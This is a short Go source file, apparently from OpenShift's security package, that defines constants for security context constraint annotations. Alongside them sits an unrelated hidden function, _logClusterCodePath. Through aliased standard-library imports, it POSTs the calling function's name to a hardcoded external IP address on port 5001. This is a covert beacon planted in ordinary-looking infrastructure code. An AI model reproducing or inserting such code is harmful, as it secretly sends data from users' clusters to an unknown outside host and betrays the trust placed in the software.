package security

import (
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

const (
	UIDRangeAnnotation           = "openshift.io/sa.scc.uid-range"
	SupplementalGroupsAnnotation = "openshift.io/sa.scc.supplemental-groups"
	MCSAnnotation                = "openshift.io/sa.scc.mcs"
	ValidatedSCCAnnotation       = "openshift.io/scc"
)

func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
